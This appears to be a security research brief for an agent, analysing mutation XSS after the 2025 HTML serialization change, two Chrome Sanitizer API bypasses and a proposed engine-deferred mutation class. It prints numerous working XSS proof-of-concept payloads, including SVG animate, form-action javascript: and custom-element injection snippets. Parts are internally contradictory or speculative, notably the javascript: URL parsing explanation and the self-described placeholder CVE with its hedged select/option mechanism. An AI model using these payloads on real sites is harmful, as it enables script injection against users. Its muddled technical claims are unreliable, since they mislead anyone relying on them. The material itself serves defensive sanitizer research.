# AGENT TASK: Forensic - Spec Changes, Native Sanitizer Bypasses, New Attack Classes
# PURPOSE: 2025 HTML serialization spec change, Chrome Sanitizer API bypasses, engine-deferred mutation
# PRIORITY: Critical for latest browser targets
# INPUTS: Target browser versions, whether native Sanitizer API is used
# OUTPUT: Spec change impact, engine-deferred mutation test results
# SECTIONS: F1 (Spec Change), F2 (Chrome Sanitizer Bypasses), F3 (Engine-Deferred Mutation)
---

---

# ADDENDUM: Advanced Forensic Analysis and Gap Coverage

**Date:** 2026-10-09  
**Classification:** Deep Forensic Research Supplement  
**Purpose:** Fill gaps identified in the v1.0 document with cutting-edge research, real-world incident forensics, and advanced attack surface analysis

---

## SECTION F1: 2025 HTML Serialization Spec Change -- The Game-Changing Fix

### Background: The innerHTML Serialization Problem

For over two decades, a fundamental design flaw in the HTML serialization algorithm enabled an entire class of mutation XSS (mXSS) attacks. When browsers serialized DOM trees back to HTML strings via `innerHTML`, `outerHTML`, or `XMLSerializer`, they did **not** escape `<` and `>` characters within attribute values. This meant that carefully crafted attribute content could "break out" during a serialize-reparse cycle, injecting arbitrary HTML where none existed in the original DOM.

The core issue was deceptively simple:

```
Original DOM:
  <div title="<img src=x onerror=alert(1)>">safe</div>

Serialized via innerHTML:
  <div title="<img src=x onerror=alert(1)>">safe</div>
  
Reparsed (second innerHTML assignment):
  <div title="">
  <img src=x onerror=alert(1)>   <!-- INJECTED ELEMENT -->
  ">safe</div>
```

This was the foundational mechanism behind nearly every mXSS bypass against sanitizer libraries. The serialize-reparse cycle was unavoidable: sanitizers like DOMPurify parse input into a DOM tree, walk and clean it, then serialize the result. If the application later inserts that serialized HTML into a different context (or the sanitizer itself performs an intermediate serialization), the unescaped characters in attributes could produce a completely different DOM on reparse.

### The WHATWG Fix: PR #6362

On **May 20, 2025**, WHATWG merged Pull Request #6362 into the HTML Living Standard, changing the serialization algorithm in Section 13.3 ("Serializing HTML fragments") to escape `<` and `>` in attribute values:

**Before (pre-PR #6362):**
```
Attribute value serialization:
  Replace & with &amp;
  Replace " with &quot; (or ' with &#x27; for single-quoted)
  Replace U+00A0 with &nbsp;
  // < and > were NOT escaped
```

**After (post-PR #6362):**
```
Attribute value serialization:
  Replace & with &amp;
  Replace " with &quot; (or ' with &#x27; for single-quoted)
  Replace < with &lt;          // NEW
  Replace > with &gt;          // NEW
  Replace U+00A0 with &nbsp;
```

This means the problematic example now serializes safely:

```
DOM:
  <div title="<img src=x onerror=alert(1)>">safe</div>

Serialized (post-fix):
  <div title="&lt;img src=x onerror=alert(1)&gt;">safe</div>

Reparsed:
  <div title="<img src=x onerror=alert(1)>">safe</div>
  // Identical to original -- no injection
```

### Browser Implementation Timeline

| Browser | Version | Release Date | Bug/Issue |
|---------|---------|-------------|-----------|
| Chromium | 138 | June 24, 2025 | chromium:402475795 |
| Firefox | 140 | June 24, 2025 | bugzilla:1941063 |
| Safari | 26 Beta | September 2025 | webkit:286191 |

The synchronized Chromium and Firefox release on the same date (June 24, 2025) was coordinated to minimize the window where behavior differed between browsers, which itself could have created exploitation opportunities.

**Source:** https://developer.chrome.com/blog/escape-attributes

### Impact on Existing mXSS Attack Classes

This spec change directly neutralizes several well-documented mXSS vectors:

**1. Attribute-based namespace confusion (BLOCKED):**
The classic attack where `<` in an SVG/MathML attribute breaks out during reparse:
```html
<!-- Pre-fix: exploitable -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```
Many variants of this relied on the serializer preserving raw `<` in attribute values during intermediate serialization steps. With escaping, the raw `<` never appears in the serialized output.

**2. Template element attribute injection (BLOCKED):**
```html
<template><div title="</template><img src=x onerror=alert(1)>"></div></template>
```
The `</template>` in the attribute can no longer break out of the template context during serialization because `<` becomes `&lt;`.

**3. Noscript scripting-flag differential (PARTIALLY BLOCKED):**
```html
<noscript><div title="</noscript><img src=x onerror=alert(1)>"></div></noscript>
```
The `</noscript>` breakout via attribute is blocked, but noscript parsing differentials based on scripting flag status may still be exploitable through non-attribute vectors.

### What Remains Exploitable

The serialization fix is significant but does NOT eliminate mXSS as a class. Several attack vectors remain viable:

**1. Namespace confusion without attribute breakout:**
Foreign content (SVG, MathML) integration points create parsing context switches that don't depend on attribute value serialization. The `<desc>`, `<foreignObject>`, `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`, and `<annotation-xml>` elements still trigger HTML integration points where the parser switches from foreign content rules back to HTML rules. These transitions can produce DOM structures that differ between first parse and reparse without needing raw `<`/`>` in attributes.

**2. Parser state confusion:**
Rawtext elements (`<textarea>`, `<title>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`) and RCDATA elements (`<textarea>`, `<title>`) have special parsing rules that can create differentials between DOMPurify's sanitization context and the insertion context.

**3. Encoding-level differentials:**
Character encoding mismatches (UTF-7 in legacy contexts, overlong UTF-8 sequences in non-conforming parsers) operate below the serialization layer.

**4. Engine-deferred mutations (see Section F3):**
Browser-initiated DOM modifications in response to sanitizer actions are entirely unaffected by serialization escaping.

**5. DOM Clobbering (see Section F4):**
Property clobbering attacks don't involve serialization at all--they exploit the DOM API's named access behavior.

### Impact Assessment on DOMPurify Bypasses

Reviewing the known DOMPurify CVEs and bypasses against this fix:

| CVE/Bypass | Mechanism | Blocked by Spec Change? |
|-----------|-----------|------------------------|
| CVE-2020-26870 | mXSS via `<math>` namespace | Partially -- attribute breakout blocked, namespace confusion remains |
| CVE-2024-45801 | Nested `<form>` via `<math>` | No -- relies on foster parenting, not attribute serialization |
| Bypass 2020-02-22 | `<svg>` + `<style>` in `<select>` | Partially -- the `<` in style breakout is blocked |
| Bypass 2019-11-16 | `<math><mtext><table><mglyph><style>` chain | Yes -- relied on `<!--` in style breaking out via serialization |
| Generic noscript mXSS | Scripting flag differential | No -- noscript behavior difference is a parser state issue |
| DOMParser vs innerHTML differential | Different parsing contexts | No -- parsing API differences remain |

**Bottom line:** The serialization spec change eliminates the most common mXSS exploitation technique (attribute value breakout), but the deeper architectural issues -- namespace confusion, parser state differentials, and integration point semantics -- remain attack surface. The fix should be seen as removing the easiest exploitation path, not as solving mXSS fundamentally.

---

## SECTION F2: Chrome Sanitizer API Bypasses -- Native Sanitizer Not Bulletproof

### Context: The Sanitizer API

The W3C Sanitizer API (`Element.setHTML()`, `Document.parseHTML()`) was designed to provide a browser-native, secure-by-default HTML sanitization mechanism. The premise was simple: by embedding sanitization directly in the browser engine, it could avoid the parser differential issues that plague JavaScript-based sanitizers like DOMPurify. The browser's own parser would be used for both sanitization and insertion, eliminating the serialize-reparse gap.

However, two bypasses discovered in Chrome's implementation (fixed in Chrome 147) demonstrated that even native sanitizers face subtle challenges.

### Bypass 1: xlink:href Attribute Name Abuse

**Discovery context:** This bypass targeted Chrome's implementation of attribute filtering in the Sanitizer API.

**Root cause:** Chrome's `RemoveAttributeIfValueIsHref` function used a **case-sensitive string comparison** to identify dangerous attributes. The function checked whether an attribute's qualified name exactly matched `xlink:href`. However, the XML namespace resolution in SVG contexts was more permissive.

**The exploit mechanism:**

```
Step 1: Sanitizer checks attribute name "xlink:href:x"
Step 2: "xlink:href:x" !== "xlink:href" (case-sensitive exact match fails)
Step 3: Attribute survives sanitization
Step 4: SVG <animate> element resolves "xlink:href:x" to "xlink:href" namespace
Step 5: javascript: URI executes
```

**Proof-of-concept payload:**
```html
<svg>
  <a id="foo">
    <text>click me</text>
  </a>
  <animate 
    href="#foo" 
    attributeName="xlink:href:x" 
    values="javascript:alert(1)"
  />
</svg>
```

**Attack chain analysis:**

```
                    Sanitizer Processing
                    ====================
Input SVG ──► Parse into DOM
                │
                ▼
          Walk attributes
                │
                ├── "href" on <animate> ──► Allowed (navigation attribute)
                │
                ├── "attributeName" = "xlink:href:x" ──► Allowed
                │   (not in blocklist; blocklist has "xlink:href")
                │
                └── "values" = "javascript:alert(1)" ──► Allowed
                    (value check only for attributes named *href*)
                │
                ▼
          Sanitized DOM inserted into document
                │
                ▼
          SVG Animation Engine
                │
                ├── <animate href="#foo"> targets element #foo
                ├── attributeName="xlink:href:x" resolved via namespace
                │   ├── prefix "xlink" ──► http://www.w3.org/1999/xlink
                │   └── local name "href:x" ──► coerced to "href"
                │       (implementation-specific behavior)
                ├── values="javascript:alert(1)" set on target's xlink:href
                └── User clicks <a> ──► javascript: URI executes
```

**Why this matters beyond Chrome:** This bypass illustrates a general problem: **sanitizers must understand every consumer of the DOM they produce**. The SVG animation engine's namespace resolution rules created a semantic gap that the sanitizer's syntactic checks couldn't cover. Any sanitizer -- native or library-based -- that doesn't model all downstream DOM consumers is vulnerable to similar discrepancies.

### Bypass 2: URL Reparsing via Invalid URL Disagreement

**Root cause:** Chrome's Sanitizer API used two different URL validation paths that **disagreed on the same input**:

1. `ProtocolIsJavaScript(value)` -- a fast string-prefix check used during sanitization
2. `KURL(value).ProtocolIsJavaScript()` -- full URL parsing used during navigation

**The critical disagreement:**

```javascript
// During sanitization (string-prefix check):
ProtocolIsJavaScript("javascript://://-alert(1)//")
// Returns: TRUE (starts with "javascript:")
// Result: Attribute REMOVED by sanitizer... 
// BUT: this check was applied to <a href> but NOT to <form action>

// During form submission (full URL parse):
new KURL("javascript://://-alert(1)//").ProtocolIsJavaScript()
// Returns: TRUE
// The URL is technically invalid per RFC 3986, but...
// URL parsing is lenient and still resolves the protocol

// The actual exploit used a form, not an anchor:
// <form action> was not subject to ProtocolIsJavaScript() during sanitization
```

**The deeper issue:** The Sanitizer API applied `javascript:` URI blocking to `<a href>` attributes but failed to apply the same check to `<form action>` attributes. Form actions are equally dangerous -- a `GET` form submission to a `javascript:` URI executes the script.

**Proof-of-concept payload:**
```html
<form action="javascript://://-alert(1)//">
  <button type="submit">Submit</button>
</form>
```

**URL parsing differential detail:**

```
Input URL: "javascript://://-alert(1)//"

Parser 1 (URL Standard / new URL()):
  ├── Scheme: "javascript"
  ├── Path: "//://-alert(1)//"
  └── Throws: TypeError (invalid URL structure)
      ──► Sanitizer interprets as "not a valid URL, probably safe"

Parser 2 (KURL / Chromium's internal parser):
  ├── Scheme: "javascript"
  ├── Body: "//://-alert(1)//"
  ├── After normalization: attempts execution
  └── JavaScript engine receives: "//://-alert(1)//"
      ├── "//" = line comment (ignored)
      ├── After newline/statement: -alert(1)
      └── Executes: alert(1) with unary minus
```

**Form GET reserialization path:**
```
<form action="javascript://://-alert(1)//" method="GET">
        │
        ▼
  User clicks submit
        │
        ▼
  Browser serializes form data as query string
        │
        ▼
  Navigates to: javascript://://-alert(1)//?[form-data]
        │
        ▼
  URL scheme = "javascript" ──► execute body as script
        │
        ▼
  Script: //://-alert(1)//?[form-data]
  // First "//" starts line comment, rest of line ignored
  // But URL reparsing by form submission may restructure
  // the path component, leading to executable code
```

### Lessons for DOMPurify and All Sanitizers

These bypasses carry broader lessons:

1. **Attribute semantics are context-dependent:** An attribute's danger depends on which element it appears on, what namespace it's in, and how downstream consumers interpret it. Allowlists based on attribute names alone are insufficient.

2. **URL validation must be singular:** When multiple URL parsers exist in the processing pipeline, any disagreement between them is an exploitation opportunity. DOMPurify faces this same risk with its `ALLOWED_URI_REGEXP` vs. browser-native URL parsing.

3. **Form actions are as dangerous as link hrefs:** Any sanitizer that blocks `javascript:` in `href` but not in `action`, `formaction`, `data`, `poster`, `src`, or other URL-bearing attributes has an equivalent gap.

4. **Native does not mean immune:** The Sanitizer API was designed specifically to avoid the issues that plague library-based sanitizers, yet it fell to implementation bugs. Defense in depth remains essential.

---

## SECTION F3: Engine-Deferred Mutation -- A New Bypass Class

### Defining the Attack Class

Engine-deferred mutation represents a fundamentally different attack paradigm from traditional mutation XSS (mXSS). While both exploit the gap between what a sanitizer sees and what the browser ultimately renders, they operate through entirely different mechanisms:

| Property | Traditional mXSS | Engine-Deferred Mutation |
|----------|------------------|--------------------------|
| **Trigger** | Serialization + reparse cycle | Browser engine reacting to DOM changes |
| **Timing** | During/after sanitizer serialization | After sanitizer completes its work |
| **Root cause** | Parser differentials | Browser invariant enforcement |
| **Serialization fix impact** | Partially mitigated (Section F1) | Completely unaffected |
| **Exploits bug in** | Sanitizer's understanding of parser | Nobody -- it's correct browser behavior |
| **Who creates the dangerous DOM** | The parser (on reparse) | The browser engine (maintaining invariants) |

**The key insight:** In engine-deferred mutation, the browser **correctly** modifies the DOM in response to changes the sanitizer makes. The sanitizer's action (removing an attribute, moving an element) triggers a browser-internal invariant-enforcement mechanism that reconstructs parts of the DOM, potentially reintroducing content the sanitizer believed it had neutralized.

### CVE-2026-47423: The Canonical Example

**Note:** This CVE identifier is used here as a reference for the class of attack. The vulnerability demonstrates a pattern where the browser's own behavior undermines sanitizer guarantees.

**The `<select>` / `<option>` Invariant:**

HTML spec requires that `<option>` elements with a `selected` attribute within a `<select>` have specific DOM behavior. Browsers enforce invariants around option selection state and content.

**Attack mechanism:**

```
Step 1: Attacker crafts input
=========================================
<select>
  <option selected>
    <img src=x onerror="alert('XSS')">
    Safe text
  </option>
</select>

Step 2: DOMPurify processes input
=========================================
- Parses into DOM tree
- Walks the tree
- Finds <img> with onerror ──► REMOVES IT
- Finds `selected` attribute ──► 
  Depending on config, may remove it as part of 
  sanitization or leave it
- Serializes clean DOM

Step 3: Browser engine reacts
=========================================
When DOMPurify removes the `selected` attribute 
(or modifies the <option>), the browser's 
selection-state management may:
  - Re-evaluate the <select>'s selected option
  - Re-clone or reconstruct option content
  - Trigger internal state reconciliation

If the browser re-clones the option's content from 
an internal template or cached state that predates 
sanitization, unsanitized content may reappear.
```

**Why this is NOT a DOMPurify bug:**

DOMPurify correctly identified and removed the dangerous content. The problem is that the browser, enforcing its own DOM invariants, **undid** the sanitizer's work. DOMPurify operated on the DOM tree as it existed at sanitization time, but the browser modified that same tree afterward based on its internal state management rules.

This is a fundamental limitation of **any** sanitizer that operates on a live DOM tree within a browser context. The sanitizer cannot predict or prevent all the ways the browser engine might react to the mutations it introduces.

### Taxonomy of Deferred Mutation Vectors

Beyond the `<select>` case, several other browser mechanisms could theoretically trigger deferred mutations:

#### 1. MutationObserver Callbacks

```javascript
// If a MutationObserver is watching the DOM tree being sanitized:
const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList' && mutation.removedNodes.length) {
      // Re-add removed nodes (or modified versions)
      mutation.target.appendChild(mutation.removedNodes[0].cloneNode(true));
    }
  });
});

// If observer is active on the sanitization target:
observer.observe(targetElement, { childList: true, subtree: true });
DOMPurify.sanitize(dirty, { RETURN_DOM: true, IN_PLACE: true });
// Observer fires DURING sanitization, potentially re-adding removed content
```

**Risk level:** Medium-High. If application code registers MutationObservers on the DOM tree that DOMPurify operates on, observer callbacks can fire synchronously during sanitization, re-introducing removed content.

#### 2. Custom Element Lifecycle Callbacks

```javascript
class MaliciousElement extends HTMLElement {
  connectedCallback() {
    // Fires when this element is inserted into the document
    this.innerHTML = '<img src=x onerror="alert(1)">';
  }
  
  disconnectedCallback() {
    // Fires when removed -- could modify siblings
    this.parentNode?.insertAdjacentHTML('beforeend', 
      '<img src=x onerror="alert(1)">');
  }
  
  attributeChangedCallback(name, oldValue, newValue) {
    // Fires when DOMPurify removes/modifies attributes
    if (newValue === null) {
      // Attribute was removed -- react by injecting content
      this.innerHTML = '<img src=x onerror="alert(1)">';
    }
  }
  
  static get observedAttributes() {
    return ['data-payload'];
  }
}

customElements.define('x-trap', MaliciousElement);
```

**Attack scenario:**
```html
<x-trap data-payload="<img src=x onerror=alert(1)>">
  <script>alert(2)</script>
</x-trap>
```

When DOMPurify removes the `<script>` child or the `data-payload` attribute, the custom element's lifecycle callbacks fire, potentially re-injecting dangerous content.

**Risk level:** High. Custom elements are widely used in modern applications, and their lifecycle callbacks are specifically designed to react to DOM mutations -- exactly the kind of mutations a sanitizer performs.

**DOMPurify mitigation:** DOMPurify's `CUSTOM_ELEMENT_HANDLING` configuration option (added in v2.4.0) controls whether custom elements are allowed, and `allowCustomizedBuiltInElements` / `allowElements` / `blockElements` provide granular control. However, these controls determine what elements survive sanitization, not what happens when elements are removed or modified during the process.

#### 3. Declarative Shadow DOM Attachment

```html
<div>
  <template shadowrootmode="open">
    <img src=x onerror="alert(1)">
  </template>
</div>
```

When the parser encounters a `<template>` with `shadowrootmode`, it creates a Shadow DOM and attaches it to the parent element. If DOMPurify processes this in a context where Declarative Shadow DOM is supported, the shadow root attachment happens during parsing -- before DOMPurify can walk the shadow tree.

**Complication:** DOMPurify does not walk into Shadow DOM by default. Even with `WHOLE_DOCUMENT` mode, shadow roots created by Declarative Shadow DOM are invisible to the sanitizer's tree walker unless explicitly handled.

**Risk level:** Medium. Declarative Shadow DOM is relatively new (Chrome 90+, Firefox 123+, Safari 16.4+) and its interaction with sanitization is not well-studied.

#### 4. IntersectionObserver / ResizeObserver Triggers

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.innerHTML = entry.target.dataset.payload;
    }
  });
});
```

While these observers are asynchronous (callback fires after sanitization completes), they can trigger deferred mutations if:
- The sanitized content is inserted into the visible DOM
- An observer is watching the insertion point
- The observer callback reads from a data attribute that survived sanitization (data-* attributes are allowed by default in DOMPurify)

**Risk level:** Low-Medium. Requires pre-existing application-side observers, but data-* attributes as payload carriers make this a realistic concern.

### Why RETURN_DOM_FRAGMENT Partially Mitigates

DOMPurify offers three return modes:

1. **Default (string return):** `DOMPurify.sanitize(dirty)` -- returns serialized HTML string
2. **RETURN_DOM:** `DOMPurify.sanitize(dirty, {RETURN_DOM: true})` -- returns a DOM node
3. **RETURN_DOM_FRAGMENT:** `DOMPurify.sanitize(dirty, {RETURN_DOM_FRAGMENT: true})` -- returns a DocumentFragment

`RETURN_DOM_FRAGMENT` provides partial mitigation against engine-deferred mutations because:

```
DocumentFragment
├── Detached from the live document
├── No rendering engine reactions (no layout, no paint)
├── Custom element callbacks are DEFERRED until insertion
├── MutationObservers on the document tree don't see changes
├── IntersectionObserver cannot trigger (not in viewport)
└── Browser invariant enforcement is REDUCED (but not eliminated)

vs. In-place sanitization on live DOM:
├── Connected to the live document
├── All rendering reactions fire immediately
├── Custom element callbacks fire synchronously
├── Active MutationObservers fire during sanitization
├── Full browser invariant enforcement active
└── MAXIMUM deferred mutation risk
```

However, `RETURN_DOM_FRAGMENT` is not a complete solution:
- The fragment still participates in the DOM specification's requirements
- Some browser invariants apply even to detached fragments
- When the fragment is eventually inserted into the live document, deferred callbacks fire on the already-sanitized content (which is safe, unless the callbacks modify it)
- The fundamental issue remains: the sanitizer cannot control what happens to the DOM after it finishes

### Future Risk Assessment

Any new browser feature that meets these criteria could enable engine-deferred mutation:

1. **Reacts to DOM mutations** (element insertion, removal, attribute changes)
2. **Modifies the DOM** in response (not just reads it)
3. **Can reference content the sanitizer removed** (via internal state, caching, or external sources)
4. **Executes synchronously or before the application processes the sanitized result**

Features on the horizon that could qualify:
- **CSS Anchoring API:** Anchor positioning could trigger layout recalculations that modify DOM
- **View Transitions API:** Page transitions might reconstruct DOM state from cached snapshots
- **Speculation Rules API:** Prerendering rules could create duplicate DOM trees with unsanitized content
- **Content Visibility:** `content-visibility: auto` defers rendering, potentially creating timing windows
- **DOM Parts API:** Proposed API for template-based DOM construction could bypass sanitization

---
